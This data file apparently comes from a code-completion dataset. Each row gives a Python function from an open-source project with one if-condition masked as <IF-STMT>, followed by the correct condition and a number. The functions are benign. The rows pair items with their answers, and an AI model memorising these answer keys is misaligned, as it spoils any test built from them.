1407,"def delete_oidc_session_tokens(session):<tab>if session:<tab><tab><IF-STMT><tab><tab><tab>del session[""oidc_access_token""]<tab><tab>if ""oidc_id_token"" in session:<tab><tab><tab>del session[""oidc_id_token""]<tab><tab>if ""oidc_id_token_expiration"" in session:<tab><tab><tab>del session[""oidc_id_token_expiration""]<tab><tab>if ""oidc_login_next"" in session:<tab><tab><tab>del session[""oidc_login_next""]<tab><tab>if ""oidc_refresh_token"" in session:<tab><tab><tab>del session[""oidc_refresh_token""]<tab><tab>if ""oidc_state"" in session:<tab><tab><tab>del session[""oidc_state""]","if ""oidc_access_token"" in session :",179
1408,"def calc_parity(sig, kind):<tab>if kind in (""zero"", ""none""):<tab><tab>return C(0, 1)<tab>elif kind == ""one"":<tab><tab>return C(1, 1)<tab>else:<tab><tab>bits, _ = value_bits_sign(sig)<tab><tab>even_parity = sum([sig[b] for b in range(bits)]) & 1<tab><tab>if kind == ""odd"":<tab><tab><tab>return ~even_parity<tab><tab><IF-STMT><tab><tab><tab>return even_parity<tab><tab>else:<tab><tab><tab>assert False","elif kind == ""even"" :",141
1409,"def parse_cookies(cookies_headers):<tab>parsed = {}<tab>for cookie in cookies_headers:<tab><tab>cookie = cookie.split("";"")<tab><tab>for c in cookie:<tab><tab><tab>(name, value) = c.split(""="", 1)<tab><tab><tab>name = name.strip()<tab><tab><tab>value = value.strip()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>parsed[name] = value<tab>return parsed",if name . lower ( ) in _SPECIAL_COOKIE_NAMES :,114
1410,"def search_rotate(array, val):<tab>low, high = 0, len(array) - 1<tab>while low <= high:<tab><tab>mid = (low + high) // 2<tab><tab>if val == array[mid]:<tab><tab><tab>return mid<tab><tab><IF-STMT><tab><tab><tab>if array[low] <= val <= array[mid]:<tab><tab><tab><tab>high = mid - 1<tab><tab><tab>else:<tab><tab><tab><tab>low = mid + 1<tab><tab>else:<tab><tab><tab>if array[mid] <= val <= array[high]:<tab><tab><tab><tab>low = mid + 1<tab><tab><tab>else:<tab><tab><tab><tab>high = mid - 1<tab>return -1",if array [ low ] <= array [ mid ] :,166
1411,"def _get_instance_attribute(<tab>self, attr, default=None, defaults=None, incl_metadata=False):<tab>if self.instance is None or not hasattr(self.instance, attr):<tab><tab><IF-STMT><tab><tab><tab>return self.parsed_metadata[attr]<tab><tab>elif defaults is not None:<tab><tab><tab>for value in defaults:<tab><tab><tab><tab>if callable(value):<tab><tab><tab><tab><tab>value = value()<tab><tab><tab><tab>if value is not None:<tab><tab><tab><tab><tab>return value<tab><tab>return default<tab>return getattr(self.instance, attr)",if incl_metadata and attr in self . parsed_metadata :,149
1412,"def _handle_rate_limit(<tab>self, exception: RedditAPIException) -> Optional[Union[int, float]]:<tab>for item in exception.items:<tab><tab><IF-STMT><tab><tab><tab>amount_search = self._ratelimit_regex.search(item.message)<tab><tab><tab>if not amount_search:<tab><tab><tab><tab>break<tab><tab><tab>seconds = int(amount_search.group(1))<tab><tab><tab>if ""minute"" in amount_search.group(2):<tab><tab><tab><tab>seconds *= 60<tab><tab><tab>if seconds <= int(self.config.ratelimit_seconds):<tab><tab><tab><tab>sleep_seconds = seconds + min(seconds / 10, 1)<tab><tab><tab><tab>return sleep_seconds<tab>return None","if item . error_type == ""RATELIMIT"" :",181
1413,"def _split_values(self, value):<tab># do the regex mojo here<tab>if not self.allowed_values:<tab><tab>return ("""",)<tab>try:<tab><tab>r = re.compile(self.allowed_values)<tab>except:<tab><tab>print(self.allowed_values, file=sys.stderr)<tab><tab>raise<tab>s = str(value)<tab>i = 0<tab>vals = []<tab>while True:<tab><tab>m = r.search(s[i:])<tab><tab>if m is None:<tab><tab><tab>break<tab><tab>vals.append(m.group())<tab><tab>delimiter = s[i : i + m.start()]<tab><tab><IF-STMT><tab><tab><tab>self.delimiter = delimiter<tab><tab>i += m.end()<tab>return tuple(vals)","if self . delimiter is None and delimiter != """" :",192
1414,"def render(self, mode=""none""):<tab>""""""Renders the environment via matplotlib.""""""<tab>if mode == ""log"":<tab><tab>self.logger.info(""Performance: "" + str(self._portfolio.performance))<tab>elif mode == ""chart"":<tab><tab><IF-STMT><tab><tab><tab>raise NotImplementedError()<tab><tab>self.viewer.render(<tab><tab><tab>self.clock.step - 1, self._portfolio.performance, self._broker.trades<tab><tab>)",if self . viewer is None :,120
1415,"def load_vocabulary(vocab_file):<tab>with open(vocab_file, ""r"") as f:<tab><tab>vocabulary = []<tab><tab>for line in f:<tab><tab><tab>line = line.strip()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>line = line.split("" "")[0]<tab><tab><tab>vocabulary.append(line)<tab><tab>return vocabulary","if "" "" in line :",88
1416,"def test_confirm_extension_is_yml(self):<tab>files_with_incorrect_extensions = []<tab>for file in self.yield_next_rule_file_path(self.path_to_rules):<tab><tab>file_name_and_extension = os.path.splitext(file)<tab><tab>if len(file_name_and_extension) == 2:<tab><tab><tab>extension = file_name_and_extension[1]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>files_with_incorrect_extensions.append(file)<tab>self.assertEqual(<tab><tab>files_with_incorrect_extensions,<tab><tab>[],<tab><tab>Fore.RED + ""There are rule files with extensions other than .yml"",<tab>)","if extension != "".yml"" :",172
1417,"def diff_from_indeces(self, indeces):<tab>rgroups = []<tab>with self._lock:<tab><tab>for i in indeces:<tab><tab><tab>rgroup = self.events[i]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>rgroups.append(rgroup)<tab>return ""\n"".join(rgroup.diff for rgroup in rgroups)","if isinstance ( rgroup , findlib2 . ReplaceHitGroup ) :",100
1418,"def deep_update(config, override_config):<tab>for k, v in override_config.items():<tab><tab>if isinstance(v, Mapping):<tab><tab><tab>k_config = config.get(k, {})<tab><tab><tab><IF-STMT><tab><tab><tab><tab>v_config = deep_update(k_config, v)<tab><tab><tab><tab>config[k] = v_config<tab><tab><tab>else:<tab><tab><tab><tab>config[k] = v<tab><tab>else:<tab><tab><tab>config[k] = override_config[k]<tab>return config","if isinstance ( k_config , Mapping ) :",136
1419,"def GetBoundingBoxMin(self):<tab>""""""Get the minimum bounding box.""""""<tab>x1, y1 = 10000, 10000<tab>x2, y2 = -10000, -10000<tab>for point in self._lineControlPoints:<tab><tab>if point[0] < x1:<tab><tab><tab>x1 = point[0]<tab><tab><IF-STMT><tab><tab><tab>y1 = point[1]<tab><tab>if point[0] > x2:<tab><tab><tab>x2 = point[0]<tab><tab>if point[1] > y2:<tab><tab><tab>y2 = point[1]<tab>return x2 - x1, y2 - y1",if point [ 1 ] < y1 :,158
1420,"def insertChars(self, chars):<tab>tc = self.editBoxes[self.ind].textCursor()<tab>if tc.hasSelection():<tab><tab>selection = tc.selectedText()<tab><tab><IF-STMT><tab><tab><tab>if len(selection) > 2 * len(chars):<tab><tab><tab><tab>selection = selection[len(chars) : -len(chars)]<tab><tab><tab><tab>tc.insertText(selection)<tab><tab>else:<tab><tab><tab>tc.insertText(chars + tc.selectedText() + chars)<tab>else:<tab><tab>tc.insertText(chars)",if selection . startswith ( chars ) and selection . endswith ( chars ) :,146
1421,"def prepare_text(text, style):<tab>body = []<tab>for fragment, sty in parse_tags(text, style, subs.styles):<tab><tab>fragment = fragment.replace(r""\h"", "" "")<tab><tab>fragment = fragment.replace(r""\n"", ""\n"")<tab><tab>fragment = fragment.replace(r""\N"", ""\n"")<tab><tab>if sty.italic:<tab><tab><tab>fragment = ""<i>%s</i>"" % fragment<tab><tab>if sty.underline:<tab><tab><tab>fragment = ""<u>%s</u>"" % fragment<tab><tab><IF-STMT><tab><tab><tab>fragment = ""<s>%s</s>"" % fragment<tab><tab>body.append(fragment)<tab>return re.sub(""\n+"", ""\n"", """".join(body).strip())",if sty . strikeout :,180
1422,"def mFEBRUARY(<tab>self,):<tab>try:<tab><tab>_type = FEBRUARY<tab><tab>_channel = DEFAULT_CHANNEL<tab><tab>pass<tab><tab>self.match(""feb"")<tab><tab>alt14 = 2<tab><tab>LA14_0 = self.input.LA(1)<tab><tab><IF-STMT><tab><tab><tab>alt14 = 1<tab><tab>if alt14 == 1:<tab><tab><tab>pass<tab><tab><tab>self.match(""ruary"")<tab><tab>self._state.type = _type<tab><tab>self._state.channel = _channel<tab>finally:<tab><tab>pass",if LA14_0 == 114 :,147
1423,"def test_calendar(self):<tab>subreddit = self.reddit.subreddit(pytest.placeholders.test_subreddit)<tab>widgets = subreddit.widgets<tab>with self.use_cassette(""TestSubredditWidgets.fetch_widgets""):<tab><tab>calendar = None<tab><tab>for widget in widgets.sidebar:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>calendar = widget<tab><tab><tab><tab>break<tab><tab>assert isinstance(calendar, Calendar)<tab><tab>assert calendar == calendar<tab><tab>assert calendar.id == calendar<tab><tab>assert calendar in widgets.sidebar<tab><tab>assert isinstance(calendar.configuration, dict)<tab><tab>assert hasattr(calendar, ""requiresSync"")<tab><tab>assert subreddit == calendar.subreddit","if isinstance ( widget , Calendar ) :",187
1424,"def count(num):<tab>cnt = 0<tab>for i in range(num):<tab><tab>try:<tab><tab><tab>if i % 2:<tab><tab><tab><tab>raise ValueError<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ArithmeticError(""1"")<tab><tab>except Exception as e:<tab><tab><tab>cnt += 1<tab>return cnt",if i % 3 :,80
1425,"def pop(self):<tab>""""""Pop a nonterminal.  (Internal)""""""<tab>popdfa, popstate, popnode = self.stack.pop()<tab>newnode = self.convert(self.grammar, popnode)<tab>if newnode is not None:<tab><tab><IF-STMT><tab><tab><tab>dfa, state, node = self.stack[-1]<tab><tab><tab>node[-1].append(newnode)<tab><tab>else:<tab><tab><tab>self.rootnode = newnode<tab><tab><tab>try:<tab><tab><tab><tab>self.rootnode.used_names = self.used_names<tab><tab><tab>except AttributeError:<tab><tab><tab><tab># Don't need this hack?<tab><tab><tab><tab>pass",if self . stack :,162
1426,"def handle_custom_actions(self):<tab>for _, action in CustomAction.registry.items():<tab><tab>if action.resource != self.resource:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.parser.add_parser(action.action, help="""")<tab><tab>action(self.page).add_arguments(self.parser, self)",if action . action not in self . parser . choices :,92
1427,"def get_host_metadata(self):<tab>meta = {}<tab>if self.agent_url:<tab><tab>try:<tab><tab><tab>resp = requests.get(self.agent_url, timeout=1).json().get(""config"", {})<tab><tab><tab>if ""Version"" in resp:<tab><tab><tab><tab>meta[""nomad_version""] = resp.get(""Version"")<tab><tab><tab>if ""Region"" in resp:<tab><tab><tab><tab>meta[""nomad_region""] = resp.get(""Region"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>meta[""nomad_datacenter""] = resp.get(""Datacenter"")<tab><tab>except Exception as ex:<tab><tab><tab>self.log.debug(""Error getting Nomad version: %s"" % str(ex))<tab>return meta","if ""Datacenter"" in resp :",185
1428,"def _source_tuple(af, address, port):<tab># Make a high level source tuple, or return None if address and port<tab># are both None<tab>if address or port:<tab><tab>if address is None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>address = ""0.0.0.0""<tab><tab><tab>elif af == socket.AF_INET6:<tab><tab><tab><tab>address = ""::""<tab><tab><tab>else:<tab><tab><tab><tab>raise NotImplementedError(f""unknown address family {af}"")<tab><tab>return (address, port)<tab>else:<tab><tab>return None",if af == socket . AF_INET :,144
1429,"def _evoke_request(cls):<tab>succeed = False<tab>with cls.LOCK:<tab><tab>if len(cls.REQUESTING_STACK) > 0:<tab><tab><tab>resource, request_semaphore = cls.REQUESTING_STACK.pop()<tab><tab><tab>node = cls.check_availability(resource)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>cls.NODE_RESOURCE_MANAGER[node]._request(node, resource)<tab><tab><tab><tab>logger.debug(""\nEvoking requesting resource {}"".format(resource))<tab><tab><tab><tab>request_semaphore.release()<tab><tab><tab><tab>succeed = True<tab><tab><tab>else:<tab><tab><tab><tab>cls.REQUESTING_STACK.append((resource, request_semaphore))<tab><tab><tab><tab>return<tab>if succeed:<tab><tab>cls._evoke_request()",if node is not None :,188
1430,"def update_all_rhos(instances, scenario_tree, rho_value=None, rho_scale=None):<tab>assert not ((rho_value is not None) and (rho_scale is not None))<tab>for stage in scenario_tree._stages[:-1]:<tab><tab>for tree_node in stage._tree_nodes:<tab><tab><tab>for scenario in tree_node._scenarios:<tab><tab><tab><tab>rho = scenario._rho[tree_node._name]<tab><tab><tab><tab>for variable_id in tree_node._variable_ids:<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>rho[variable_id] = rho_value<tab><tab><tab><tab><tab>else:<tab><tab><tab><tab><tab><tab>rho[variable_id] *= rho_scale",if rho_value is not None :,180
1431,"def configured_request_log_handlers(config, prefix=""query_log"", default_logger=None):<tab>""""""Returns configured query loggers as defined in the `config`.""""""<tab>handlers = []<tab>for section in config.sections():<tab><tab><IF-STMT><tab><tab><tab>options = dict(config.items(section))<tab><tab><tab>type_ = options.pop(""type"")<tab><tab><tab>if type_ == ""default"":<tab><tab><tab><tab>logger = default_logger or get_logger()<tab><tab><tab><tab>handler = ext.request_log_handler(""default"", logger)<tab><tab><tab>else:<tab><tab><tab><tab>handler = ext.request_log_handler(type_, **options)<tab><tab><tab>handlers.append(handler)<tab>return handlers",if section . startswith ( prefix ) :,174
1432,"def eval_dummy_genomes_ctrnn_bad(genomes, config):<tab>for genome_id, genome in genomes:<tab><tab>net = neat.ctrnn.CTRNN.create(genome, config, 0.01)<tab><tab>net.advance([0.5, 0.5, 0.5], 0.01, 0.05)<tab><tab><IF-STMT><tab><tab><tab>genome.fitness = 0.0<tab><tab>else:<tab><tab><tab>net.reset()<tab><tab><tab>genome.fitness = 1.0",if genome_id <= 150 :,138
1433,"def housenumber(self):<tab>if self.street:<tab><tab>expression = r""\d+""<tab><tab>pattern = re.compile(expression)<tab><tab>match = pattern.search(self.street, re.UNICODE)<tab><tab><IF-STMT><tab><tab><tab>return match.group(0)",if match :,69
1434,"def func():<tab>end_received = False<tab>while True:<tab><tab>for idx, q in enumerate(self._local_out_queues):<tab><tab><tab>data = q.get()<tab><tab><tab>q.task_done()<tab><tab><tab>if isinstance(data, EndSignal):<tab><tab><tab><tab>end_received = True<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>continue<tab><tab><tab>self._out_queue.put(data)<tab><tab>if end_received:<tab><tab><tab>break",if idx > 0 :,120
1435,"def spin():<tab>""""""Wheeeee!""""""<tab>state = 0<tab>states = random.choice(spinners.spinners)<tab>while True:<tab><tab>prefix = ""[%s] "" % _spinner_style(states[state])<tab><tab>spinner_handle.update(prefix)<tab><tab>state = (state + 1) % len(states)<tab><tab><IF-STMT><tab><tab><tab>break",if stop . wait ( 0.1 ) :,103
1436,"def _format_ip_address(container_group):<tab>""""""Format IP address.""""""<tab>ip_address = container_group.get(""ipAddress"")<tab>if ip_address:<tab><tab>ports = ip_address[""ports""] or []<tab><tab><IF-STMT><tab><tab><tab>for container in container_group.get(""containers""):<tab><tab><tab><tab>ports += container.get(""ports"")<tab><tab>ports = "","".join(str(p[""port""]) for p in ports)<tab><tab>return ""{0}:{1}"".format(ip_address.get(""ip""), ports)<tab>return None","if ip_address [ ""type"" ] == ""Private"" :",141
1437,"def check(self, count, count_v, enable, clock, reset, n):<tab>expect = 0<tab>yield reset.posedge<tab>self.assertEqual(count, expect)<tab>self.assertEqual(count, count_v)<tab>while 1:<tab><tab>yield clock.posedge<tab><tab><IF-STMT><tab><tab><tab>if expect == -n:<tab><tab><tab><tab>expect = n - 1<tab><tab><tab>else:<tab><tab><tab><tab>expect -= 1<tab><tab>yield delay(1)<tab><tab># print ""%d count %s expect %s count_v %s"" % (now(), count, expect, count_v)<tab><tab>self.assertEqual(count, expect)<tab><tab>self.assertEqual(count, count_v)",if enable :,170
1438,"def _to_str(self, tokens: List[int]) -> str:<tab>pos = next(<tab><tab>(idx for idx, x in enumerate(tokens) if x == self.vocab.eos_token_id), -1<tab>)<tab>if pos != -1:<tab><tab>tokens = tokens[:pos]<tab>vocab_map = self.vocab.id_to_token_map_py<tab>words = [vocab_map[t] for t in tokens]<tab>if self.encoding is not None and self.perform_decode:<tab><tab>if self.encoding == ""bpe"":<tab><tab><tab>words = self.bpe_decode(words)<tab><tab><IF-STMT><tab><tab><tab>words = self.spm_decode(words)<tab>sentence = "" "".join(words)<tab>return sentence","elif self . encoding == ""spm"" :",188
1439,"def _iterate_files(self, files, root, include_checksums, relpath):<tab>file_list = {}<tab>for file in files:<tab><tab>exclude = False<tab><tab># exclude defined filename patterns<tab><tab>for pattern in S3Sync.exclude_files:<tab><tab><tab>if fnmatch.fnmatch(file, pattern):<tab><tab><tab><tab>exclude = True<tab><tab><tab><tab>break<tab><tab>if not exclude:<tab><tab><tab>full_path = root + ""/"" + file<tab><tab><tab><IF-STMT><tab><tab><tab><tab># get checksum<tab><tab><tab><tab>checksum = self._hash_file(full_path)<tab><tab><tab>else:<tab><tab><tab><tab>checksum = """"<tab><tab><tab>file_list[relpath + file] = [full_path, checksum]<tab>return file_list",if include_checksums :,184
1440,"def render(self, context):<tab>if self.user is None:<tab><tab>entries = LogEntry.objects.all()<tab>else:<tab><tab>user_id = self.user<tab><tab><IF-STMT><tab><tab><tab>user_id = context[self.user].pk<tab><tab>entries = LogEntry.objects.filter(user__pk=user_id)<tab>context[self.varname] = entries.select_related(""content_type"", ""user"")[<tab><tab>: int(self.limit)<tab>]<tab>return """"",if not user_id . isdigit ( ) :,126
1441,"def pin_data_keys(self, session_id, data_keys, token, devices=None):<tab>if not devices:<tab><tab>devices = functools.reduce(<tab><tab><tab>operator.or_,<tab><tab><tab>self._manager_ref.get_data_locations(session_id, data_keys),<tab><tab><tab>set(),<tab><tab>)<tab>else:<tab><tab>devices = self._normalize_devices(devices)<tab>pinned = set()<tab>for dev in devices:<tab><tab>handler = self.get_storage_handler(dev)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>keys = handler.pin_data_keys(session_id, data_keys, token)<tab><tab>pinned.update(keys)<tab>return list(pinned)","if not getattr ( handler , ""_spillable"" , False ) :",184
1442,"def resolve(self, value: Optional[T]) -> T:<tab>v: Optional[Any] = value<tab>if value is None:<tab><tab>t = os.environ.get(self.envvar)<tab><tab>if self.type is bool and t:<tab><tab><tab>v = t in [""true"", ""True"", ""1"", ""yes""]<tab><tab>elif self.type is str and t:<tab><tab><tab>v = t<tab><tab><IF-STMT><tab><tab><tab>v = ast.literal_eval(t) if t is not None else None<tab>if v is None:<tab><tab>v = self.default<tab>return v",elif t :,144
1443,"def remove(self, *objs):<tab>val = getattr(instance, rel_field.rel.get_related_field().attname)<tab>for obj in objs:<tab><tab># Is obj actually part of this descriptor set?<tab><tab><IF-STMT><tab><tab><tab>setattr(obj, rel_field.name, None)<tab><tab><tab>obj.save()<tab><tab>else:<tab><tab><tab>raise rel_field.rel.to.DoesNotExist(<tab><tab><tab><tab>""%r is not related to %r."" % (obj, instance)<tab><tab><tab>)","if getattr ( obj , rel_field . attname ) == val :",137
1444,"def generate_segment_memory(chart_type, race_configs, environment):<tab>structures = []<tab>for race_config in race_configs:<tab><tab>if ""segment_memory"" in race_config.charts:<tab><tab><tab>title = chart_type.format_title(<tab><tab><tab><tab>environment,<tab><tab><tab><tab>race_config.track,<tab><tab><tab><tab>es_license=race_config.es_license,<tab><tab><tab><tab>suffix=""%s-segment-memory"" % race_config.label,<tab><tab><tab>)<tab><tab><tab>chart = chart_type.segment_memory(title, environment, race_config)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>structures.append(chart)<tab>return structures",if chart :,168
1445,"def comment_multiline(self, text, delimiter_end, delimiter_start, style):<tab>""""""Process the beggining and end of a multiline comment.""""""<tab>startIndex = 0<tab>if self.previousBlockState() != 1:<tab><tab>startIndex = delimiter_start.indexIn(text)<tab>while startIndex >= 0:<tab><tab>endIndex = delimiter_end.indexIn(text, startIndex)<tab><tab>commentLength = 0<tab><tab><IF-STMT><tab><tab><tab>self.setCurrentBlockState(1)<tab><tab><tab>commentLength = len(text) - startIndex<tab><tab>else:<tab><tab><tab>commentLength = endIndex - startIndex + delimiter_end.matchedLength()<tab><tab>self.setFormat(startIndex, commentLength, style)<tab><tab>startIndex = delimiter_start.indexIn(text, startIndex + commentLength)",if endIndex == - 1 :,199
1446,"def getLatestFile(self):<tab>highestNsp = None<tab>highestNsx = None<tab>for nsp in self.getFiles():<tab><tab>try:<tab><tab><tab>if nsp.path.endswith("".nsx""):<tab><tab><tab><tab>if not highestNsx or int(nsp.version) > int(highestNsx.version):<tab><tab><tab><tab><tab>highestNsx = nsp<tab><tab><tab>else:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>highestNsp = nsp<tab><tab>except BaseException:<tab><tab><tab>pass<tab>return highestNsp or highestNsx",if not highestNsp or int ( nsp . version ) > int ( highestNsp . version ) :,152
1447,"def handle(self, msg):<tab>self._mic.send(msg)<tab>for calculate_seed, make_delegate, dict in self._delegate_records:<tab><tab>id = calculate_seed(msg)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>elif isinstance(id, collections.Hashable):<tab><tab><tab>if id not in dict or not dict[id].is_alive():<tab><tab><tab><tab>d = make_delegate((self, msg, id))<tab><tab><tab><tab>d = self._ensure_startable(d)<tab><tab><tab><tab>dict[id] = d<tab><tab><tab><tab>dict[id].start()<tab><tab>else:<tab><tab><tab>d = make_delegate((self, msg, id))<tab><tab><tab>d = self._ensure_startable(d)<tab><tab><tab>d.start()",if id is None :,192
1448,"def _build_pcf(named_sc, named_pc):<tab>r = """"<tab>for sig, pins, others, resname in named_sc:<tab><tab><IF-STMT><tab><tab><tab>for bit, pin in enumerate(pins):<tab><tab><tab><tab>r += ""set_io {}[{}] {}\n"".format(sig, bit, pin)<tab><tab>else:<tab><tab><tab>r += ""set_io {} {}\n"".format(sig, pins[0])<tab>if named_pc:<tab><tab>r += ""\n"" + ""\n\n"".join(named_pc)<tab>return r",if len ( pins ) > 1 :,146
1449,"def __init__(self, profile, report_dir=None, timestamp=None):<tab># self.metadata = {}<tab>self.report_dir = report_dir if report_dir else DEFAULT_REPORT_DIR<tab>self.profile = profile.replace(""/"", ""_"").replace(""\\"", ""_"")  # Issue 111<tab>self.current_time = datetime.datetime.now(dateutil.tz.tzlocal())<tab>if timestamp != False:<tab><tab>self.timestamp = (<tab><tab><tab>self.current_time.strftime(""%Y-%m-%d_%Hh%M%z"")<tab><tab><tab><IF-STMT><tab><tab><tab>else timestamp<tab><tab>)",if not timestamp,144
1450,"def _convert_params_to_v3(params):<tab>for k, v in OLD_TO_NEW_PARAMS.items():<tab><tab>if k in params:<tab><tab><tab>msg = Message.WARN_PARAMS_NOT_SUPPORTED % (k, v)<tab><tab><tab>warnings.warn(msg, DeprecationWarning)<tab><tab><tab># update to the new query param if not specified already<tab><tab><tab><IF-STMT><tab><tab><tab><tab>params[v] = params.pop(k)",if v not in params :,114
1451,"def rollup_logical(counter, lookup, logical_keys):<tab>logical = Counter()<tab>for k, v in counter.items():<tab><tab># TODO: eek, do a fallback of some kind<tab><tab><IF-STMT><tab><tab><tab>logical[(""unknown"", k)] = v<tab><tab><tab>continue<tab><tab>linfo = lookup[k]<tab><tab>lkey = tuple(linfo.get(lk, ""unknown"") for lk in logical_keys)<tab><tab>logical[lkey] += v<tab>return logical",if k not in lookup :,123
1452,"def assert_summary_equals(self, records, tag, step, value):<tab>for record in records[1:]:<tab><tab>if record.summary.value[0].tag != tag:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>self.assertEqual(value, tf.make_ndarray(record.summary.value[0].tensor))<tab><tab>return<tab>self.fail(""Could not find record for tag {} and step {}"".format(tag, step))",if record . step != step :,114
1453,"def get_name_from_types(types: Iterable[Union[Type, StrawberryUnion]]):<tab>names = []<tab>for type_ in types:<tab><tab>if isinstance(type_, StrawberryUnion):<tab><tab><tab>return type_.name<tab><tab><IF-STMT><tab><tab><tab>name = capitalize_first(type_._type_definition.name)<tab><tab>else:<tab><tab><tab>name = capitalize_first(type_.__name__)<tab><tab>names.append(name)<tab>return """".join(names)","elif hasattr ( type_ , ""_type_definition"" ) :",131
1454,"def parseBamPEFDistributionFile(self, f):<tab>d = dict()<tab>lastsample = []<tab>for line in f[""f""].splitlines():<tab><tab>cols = line.rstrip().split(""\t"")<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>elif cols[0] == ""Size"":<tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>s_name = self.clean_s_name(cols[2].rstrip().split(""/"")[-1], f[""root""])<tab><tab><tab>if s_name != lastsample:<tab><tab><tab><tab>d[s_name] = dict()<tab><tab><tab><tab>lastsample = s_name<tab><tab><tab>d[s_name].update({self._int(cols[0]): self._int(cols[1])})<tab>return d","if cols [ 0 ] == ""#bamPEFragmentSize"" :",194
1455,"def read_output(meteor_output_path, n_repeats):<tab>n_combinations = math.factorial(n_repeats) / (<tab><tab>math.factorial(2) * math.factorial(n_repeats - 2)<tab>)<tab>raw_scores = []<tab>average_scores = []<tab>for line in open(meteor_output_path):<tab><tab>if not line.startswith(""Segment ""):<tab><tab><tab>continue<tab><tab>score = float(line.strip().split(""\t"")[1])<tab><tab>raw_scores.append(score)<tab><tab><IF-STMT><tab><tab><tab>average_scores.append(sum(raw_scores) / n_combinations)<tab><tab><tab>raw_scores = []<tab>os.remove(meteor_output_path)<tab>return average_scores",if len ( raw_scores ) == n_combinations :,198
1456,"def get_new_pids(self):<tab>if not self.need_poll():<tab><tab>return<tab>for process in psutil.process_iter():<tab><tab>info = process.as_dict([""create_time"", ""pid"", ""name"", ""exe""])<tab><tab>pid = info[""pid""]<tab><tab>if pid not in self.pids or self.pids[pid] == info[""create_time""]:<tab><tab><tab>for name in self.names:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>yield pid<tab><tab><tab><tab><tab>self.pids[pid] = info[""create_time""]","if name . match ( info [ ""name"" ] ) or name . match ( info [ ""exe"" ] ) :",153
1457,"def _Attribute(self, node):<tab>if not isinstance(node.ctx, ast.Store):<tab><tab>scope = self.scope.get_inner_scope_for_line(node.lineno)<tab><tab>pyname = evaluate.eval_node(scope, node.value)<tab><tab><IF-STMT><tab><tab><tab>if node.attr not in pyname.get_object():<tab><tab><tab><tab>self._add_error(node, ""Unresolved attribute"")<tab>ast.walk(node.value, self)",if pyname is not None and pyname . get_object ( ) != pyobjects . get_unknown ( ) :,136
1458,def _init_neighbor(neighbor):<tab>families = neighbor.families()<tab>for change in neighbor.changes:<tab><tab>if change.nlri.family() in families:<tab><tab><tab># This add the family to neighbor.families()<tab><tab><tab>neighbor.rib.outgoing.add_to_rib_watchdog(change)<tab>for message in messages:<tab><tab>if message.family() in families:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>neighbor.asm[message.family()] = message<tab><tab><tab>else:<tab><tab><tab><tab>neighbor.messages.append(message)<tab>self.neighbors[neighbor.name()] = neighbor,"if message . name == ""ASM"" :",152
1459,"def date_match(self, date1, date2):<tab>if date1.is_empty() or date2.is_empty():<tab><tab>return 0<tab>if date1.is_equal(date2):<tab><tab>return 1<tab>if date1.is_compound() or date2.is_compound():<tab><tab>return self.range_compare(date1, date2)<tab>if date1.get_year() == date2.get_year():<tab><tab><IF-STMT><tab><tab><tab>return 0.75<tab><tab>if not date1.get_month_valid() or not date2.get_month_valid():<tab><tab><tab>return 0.75<tab><tab>else:<tab><tab><tab>return -1<tab>else:<tab><tab>return -1",if date1 . get_month ( ) == date2 . get_month ( ) :,189
1460,"def del_var_history(self, var, f=None, line=None):<tab>""""""If file f and line are not given, the entire history of var is deleted""""""<tab>if var in self.variables:<tab><tab><IF-STMT><tab><tab><tab>self.variables[var] = [<tab><tab><tab><tab>x for x in self.variables[var] if x[""file""] != f and x[""line""] != line<tab><tab><tab>]<tab><tab>else:<tab><tab><tab>self.variables[var] = []",if f and line :,120
1461,"def test_certs(self):<tab>self.assertTrue(len(self.regions) > 0)<tab>for region in self.regions:<tab><tab>special_access_required = False<tab><tab>for snippet in (""gov"", ""cn-""):<tab><tab><tab>if snippet in region.name:<tab><tab><tab><tab>special_access_required = True<tab><tab><tab><tab>break<tab><tab>try:<tab><tab><tab>c = region.connect()<tab><tab><tab>self.sample_service_call(c)<tab><tab>except:<tab><tab><tab># This is bad (because the SSL cert failed). Re-raise the<tab><tab><tab># exception.<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise",if not special_access_required :,161
1462,"def convert_encoder_layer(opus_dict, layer_prefix: str, converter: dict):<tab>sd = {}<tab>for k in opus_dict:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>stripped = remove_prefix(k, layer_prefix)<tab><tab>v = opus_dict[k].T  # besides embeddings, everything must be transposed.<tab><tab>sd[converter[stripped]] = torch.tensor(v).squeeze()<tab>return sd",if not k . startswith ( layer_prefix ) :,117
1463,"def test_sequence(self, sequence):<tab>for test in sequence:<tab><tab><IF-STMT><tab><tab><tab>test, kwargs = test<tab><tab>else:<tab><tab><tab>kwargs = {}<tab><tab>self.do_check(test, **kwargs)<tab><tab>if test == ExpectedError:<tab><tab><tab>return False<tab>return True","if isinstance ( test , tuple ) :",81
1464,"def make_table(grid):<tab>max_cols = [<tab><tab>max(out)<tab><tab>for out in map(list, zip(*[[len(item) for item in row] for row in grid]))<tab>]<tab>rst = table_div(max_cols, 1)<tab>for i, row in enumerate(grid):<tab><tab>header_flag = False<tab><tab><IF-STMT><tab><tab><tab>header_flag = True<tab><tab>rst += normalize_row(row, max_cols)<tab><tab>rst += table_div(max_cols, header_flag)<tab>return rst",if i == 0 or i == len ( grid ) - 1 :,147
